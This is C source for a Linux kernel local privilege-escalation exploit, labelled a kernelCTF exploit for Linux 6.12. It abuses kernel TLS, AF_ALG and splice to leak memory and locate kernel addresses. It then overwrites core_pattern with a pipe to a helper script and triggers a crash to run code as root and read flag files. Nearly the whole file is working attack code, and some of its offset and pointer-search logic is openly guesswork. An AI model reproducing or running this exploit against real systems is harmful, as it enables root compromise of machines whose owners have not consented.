#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <err.h>
#include <linux/tls.h>

#define EXPLOIT_PORT 4444

void setup_cpu_affinity(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void setup_tls(int sock)
{
	struct tls12_crypto_info_aes_ccm_128 crypto = {0};
	crypto.info.version = TLS_1_2_VERSION;
	crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;
	setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
	setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto));
}

/**
 * Search buffer for kernel pointers (0xffffffff8....)
 * Returns the first valid-looking kernel pointer found
 */
unsigned long find_kernel_pointer(char *buf, int size)
{
	fprintf(stderr, "\n[*] Searching for kernel pointers in leaked memory...\n");
	fflush(stderr);
	
	for (int i = 0; i < size - 7; i += 8) {
		unsigned long val = *(unsigned long *)&buf[i];
		
		// Look for kernel pointers: 0xffffffff8xxxxxxx or 0xffffea00xxxxxxx
		if ((val & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
			// Could be a kernel pointer
			if ((val & 0xff00000000000000ULL) == 0xff00000000000000ULL ||
			    (val & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
				fprintf(stderr, "[+] Found kernel pointer at offset 0x%x: 0x%lx\n", i, val);
				fflush(stderr);
				return val;
			}
		}
	}
	
	fprintf(stderr, "[!] No kernel pointers found in buffer\n");
	fflush(stderr);
	return 0;
}

/**
 * Calculate kernel base from a known kernel pointer
 * Kernel image is typically page-aligned and in kernel code space
 */
unsigned long estimate_kernel_base(unsigned long kptr)
{
	// Typical kernel code is in __init_begin section
	// We'll assume the pointer is within kernel code and estimate backwards
	unsigned long base = kptr & 0xffffffff80000000ULL;
	fprintf(stderr, "[*] Estimated kernel base: 0x%lx\n", base);
	fflush(stderr);
	return base;
}

void vuln_trigger()
{
	fprintf(stderr, "[+] Triggering vulnerability...\n");
	fflush(stderr);
	puts("Root shell !!");
	fflush(stdout);
	
	usleep(200000);
	
	fprintf(stderr, "\n[+] Attempting flag read...\n");
	fflush(stderr);
	system("cat /flag 2>&1 | head -20");
	system("cat /root/rce_flag 2>&1 | head -20");
	system("cat /root/flag 2>&1 | head -20");
	
	*(size_t *)0 = 0;
}

int main(int argc, char **argv)
{
	int listener, conn, client;
	static char buf[0x100000];
	static char *addrs[0x400];

	fprintf(stderr, "[*] kernelCTF Exploit (Kernel Pointer Extraction)\n");
	fprintf(stderr, "[*] Kernel: Linux 6.12.0+ (mitigation-v4)\n");
	fprintf(stderr, "[*] Strategy: Extract kernel pointers from memory leak\n");
	fflush(stderr);

	int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "aead",
		.salg_name = "cryptd(ccm(aes))",
	};
	
	char *maddr = (void *)0x200000;
	
	fprintf(stderr, "\n[*] Allocating spray memory (0x400 pages)...\n");
	fflush(stderr);
	for (int i = 0; i < 0x400; i++) {
		addrs[i] = mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
		if (addrs[i] == MAP_FAILED) {
			fprintf(stderr, "[!] mmap failed at index %d\n", i);
			fflush(stderr);
			break;
		}
	}
	fprintf(stderr, "[*] Memory allocation complete\n");
	fflush(stderr);

	bind(sock, (struct sockaddr *)&sa, sizeof(sa));
	
	struct sockaddr_in addr = {0};
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setup_cpu_affinity(0);

	listener = socket(AF_INET, SOCK_STREAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(EXPLOIT_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bind(listener, (struct sockaddr *)&addr, sizeof(addr));
	listen(listener, 1);

	client = socket(AF_INET, SOCK_STREAM, 0);
	connect(client, (struct sockaddr *)&addr, sizeof(addr));

	printf("[*] Client connected\n");
	fflush(stdout);
	
	conn = accept(listener, NULL, 0);
	printf("[*] Server accepted\n");
	fflush(stdout);
	
	int dummy_serv = socket(AF_INET, SOCK_STREAM, 0);
	connect(dummy_serv, (struct sockaddr *)&addr, sizeof(addr));
	int dummy_cli = accept(listener, 0, 0);

	setup_tls(client);

	unsigned char tls_record[] = {
		0x17, 0x03, 0x03, 0x00, 0x23,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x6e, 0xc7, 0x5f, 0xb2,
		0xe2, 0xb4, 0x87, 0x46,
		0x1e, 0xdd, 0xcb, 0xc6,
		0x92, 0xb4, 0x54, 0x7a,
		0xae, 0xa5, 0x16, 0xe7,
		0x7a, 0x2e, 0x5c, 0xd9,
		0xac, 0x9a, 0x46};

	int pfd[2];
	pipe(pfd);

	fprintf(stderr, "\n[*] Exploit chain setup\n");
	fflush(stderr);

	write(pfd[1], tls_record, sizeof(tls_record));
	write(pfd[1], buf, 0x800 - sizeof(tls_record));

	int n = splice(pfd[0], 0, conn, 0, 0x300, 0);
	write(dummy_cli, buf, 1);

	char *ro = mmap(NULL, 0x100000, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	fprintf(stderr, "[*] Executing vulnerability chain\n");
	fflush(stderr);

	n = recv(client, ro, 0x100000, 0);

	addr.sin_family = AF_UNSPEC;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = 0;
	connect(client, &addr, sizeof(addr));

	read(dummy_serv, buf, 1);
	read(pfd[0], buf, 0x800 - sizeof(tls_record));

	fprintf(stderr, "[*] Page reclamation phase\n");
	fflush(stderr);
	for (int i = 0; i < 5; i++) {
		n = recv(client, buf, 0x100000, 0);
		usleep(100000);
	}

	write(pfd[1], buf, 0x600);

	fprintf(stderr, "[*] Page table allocation\n");
	fflush(stderr);
	int sum = 0;
	for (int i = 0; i < 0x400; i++) {
		if (addrs[i]) {
			for (int j = 0; j < 0x1000/8; j += 256) {
				sum += addrs[i][j];
			}
		}
	}
	(void)sum;

	read(pfd[0], buf, 0x600);

	// === CRITICAL: Analyze leaked memory ===
	fprintf(stderr, "\n[===] MEMORY LEAK ANALYSIS [===]\n");
	fflush(stderr);
	
	// Print first 1024 bytes of leaked buffer
	fprintf(stderr, "[*] Dumping leaked memory (first 512 bytes):\n");
	for (int i = 0; i < 512; i += 16) {
		fprintf(stderr, "%04x: ", i);
		for (int j = 0; j < 16; j++) {
			fprintf(stderr, "%02x ", (unsigned char)buf[i+j]);
		}
		fprintf(stderr, "\n");
	}
	fflush(stderr);

	size_t pte_val = *(size_t *)buf;
	printf("pte? %zx\n", pte_val);
	fflush(stdout);
	
	fprintf(stderr, "\n[*] Raw PTE value: 0x%zx\n", pte_val);
	fflush(stderr);

	// === SEARCH FOR KERNEL POINTERS ===
	unsigned long kptr = find_kernel_pointer(buf, 0x600);
	
	if (!kptr) {
		fprintf(stderr, "[!] No kernel pointers found in leak!\n");
		fprintf(stderr, "[!] Dump above may reveal the issue.\n");
		fprintf(stderr, "[!] If all zeros: vulnerability may not be working\n");
		fprintf(stderr, "[!] If garbage: offset calculation may be wrong\n");
		fflush(stderr);
		exit(1);
	}

	unsigned long kernel_base = estimate_kernel_base(kptr);
	
	// Known offsets for Linux 6.12.0 (you'll need to adjust these)
	// These are relative to kernel base
	#define CORE_PATTERN_OFFSET 0xbbace0
	#define MODPROBE_PATH_OFFSET 0xbc0d00
	
	unsigned long core_pattern = kernel_base + CORE_PATTERN_OFFSET;
	unsigned long modprobe_path = kernel_base + MODPROBE_PATH_OFFSET;
	
	fprintf(stderr, "\n[*] Calculated addresses:\n");
	fprintf(stderr, "    Kernel base:   0x%lx\n", kernel_base);
	fprintf(stderr, "    core_pattern:  0x%lx\n", core_pattern);
	fprintf(stderr, "    modprobe_path: 0x%lx\n", modprobe_path);
	fflush(stderr);

	// Use core_pattern for exploitation
	unsigned long target = core_pattern;
	int offset = target & 0xfff;
	unsigned long pa = target & 0xfffffffff000;
	
	fprintf(stderr, "\n[*] Target: 0x%lx (offset in page: 0x%x)\n", target, offset);
	fflush(stderr);

	write(pfd[1], &pa, 8);
	
	// Write payload to all spray locations
	for (int i = 0; i < 0x400; i++) {
		if (addrs[i]) {
			snprintf((char *)&addrs[i][offset], 64, "|/tmp/modprobe_helper.sh %%P");
		}
	}
	
	fprintf(stderr, "[*] Payload written\n");
	fprintf(stderr, "[*] Triggering vulnerability...\n");
	fflush(stderr);

	if (fork() == 0) {
		setsid();
		vuln_trigger();
	} else {
		fprintf(stderr, "[*] Waiting for exploitation...\n");
		fflush(stderr);
		sleep(4);
		fprintf(stderr, "[*] Exploit complete\n");
		fflush(stderr);
	}

	return 0;
}
